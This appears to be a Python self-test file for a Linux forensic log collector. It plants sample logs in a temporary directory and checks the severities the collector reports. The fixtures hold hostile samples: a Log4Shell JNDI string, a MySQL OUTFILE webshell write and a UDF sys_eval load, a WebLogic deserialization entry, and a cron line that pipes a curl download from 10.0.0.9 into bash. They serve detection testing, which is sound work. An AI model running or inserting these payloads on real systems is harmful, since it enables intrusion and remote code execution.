@_case("B.linux_app_logs.正例1-离线根目录命中Web/MySQL/Redis/Docker/K8s线索")
def _st_app_logs_positive(ctx):
    d = ctx.tmpdir()
    _st_write(os.path.join(d, "var/log/nginx/access.log"),
              '10.0.0.9 - - [14/Oct/2026:10:00:00 +0800] "GET /a?x=${jndi:ldap://10.0.0.9/a} '
              'HTTP/1.1" 200 12 "-" "curl/8.0"\n'
              '10.0.0.9 - - [14/Oct/2026:10:00:01 +0800] "GET /index.html HTTP/1.1" 200 100 '
              '"-" "Mozilla/5.0"\n')
    _st_write(os.path.join(d, "etc/nginx/nginx.conf"), "server {\n    proxy_pass http://127.0.0.1:6379;\n}\n")
    _st_write(os.path.join(d, "opt/tomcat/logs/catalina.out"), "ERROR rO0AB payload detected\n")
    _st_write(os.path.join(d, "opt/tomcat/webapps/ROOT/shell.jsp"), "test\n")
    _st_write(os.path.join(d, "var/log/mysql/slow.log"),
              "# Query_time: 1.0\nselect * from x INTO OUTFILE '/var/www/html/x.php';\n")
    _st_write(os.path.join(d, "root/.mysql_history"),
              "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'\n")
    _st_write(os.path.join(d, "etc/redis/redis.conf"), "bind 0.0.0.0\nprotected-mode no\n")
    _st_write(os.path.join(d, "var/lib/docker/containers/abc/abc-json.log"),
              '{"log":"privileged=true /var/run/docker.sock","stream":"stdout"}\n')
    _st_write(os.path.join(d, "var/log/pods/default_p1_u1/ctr/0.log"), "forbidden: User cannot exec pods\n")
    _st_write(os.path.join(d, "u01/app/oracle/domains/base/servers/AdminServer/logs/AdminServer.log"),
              "<BEA-090403> <Authentication for user denied>\n"
              "10.0.0.9 - - [/wls-wsat/CoordinatorPortType] deserialization attack\n")
    c = Collector(root=d, days=30)
    linux_app_logs(c)
    lv = [f.level for f in c.findings]
    ok = ("严重" in lv and "高危" in lv and len(c.raw) >= 2 and len(c.warnings) == 1)
    return ok, {"等级": lv, "findings": len(c.findings), "raw": len(c.raw), "warnings": c.warnings[:3]}


@_case("B.linux_audit_logs.正例1-离线根目录解析 cron 日志命中下载执行")
def _st_audit_cron_content(ctx):
    d = ctx.tmpdir()
    _st_write(os.path.join(d, "var", "log", "cron"),
              "Oct 14 10:00:01 host CROND[1]: (root) CMD (curl http://10.0.0.9/a.sh | bash)\n"
              "Oct 14 10:01:01 host CROND[1]: (root) CMD (run-parts /etc/cron.hourly)\n")
    c = Collector(root=d)
    linux_audit_logs(c)
    lv = [ft.level for ft in c.findings]
    return ("中危" in lv and not any(x in ("高危", "严重") for x in lv)), lv


@_case("B.Collector.add/raw_add/warn/stage 可用")
def _st_collector_api(ctx):
    miss = [n for n in ("add", "raw_add", "warn", "stage")
            if not callable(getattr(Collector, n, None))]
    c = Collector()                       # 纯内存对象：不采集、不读盘、不联网
    c.add("不存在的等级", "自检", "降级样例")  # add 对未知等级降级为“提示”
    c.warn("warn 样例")
    c.raw_add("raw 样例", "selftest", "输出")
    c.stage("stage 样例", 1, 1)           # events=None 时应静默无异常
    ok = (not miss and len(c.findings) == 1 and c.findings[0].level == "提示"
          and len(c.warnings) == 1 and len(c.raw) == 1)
    return ok, {"缺失方法": miss, "findings": [f.level for f in c.findings],
                "warnings": len(c.warnings), "raw": len(c.raw)}


@_case("B.Finding.可实例化且字段完整")
def _st_finding_ok(ctx):
    f = Finding("高危", "自检", "标题样例", detail="细节", evidence=["证据"], advice="建议")
    d = f.to_dict()
    f2 = Finding("提示", "自检", "无证据样例")
    ok = (d.get("level") == "高危" and d.get("evidence") == ["证据"] and f2.evidence == [])
    return ok, d


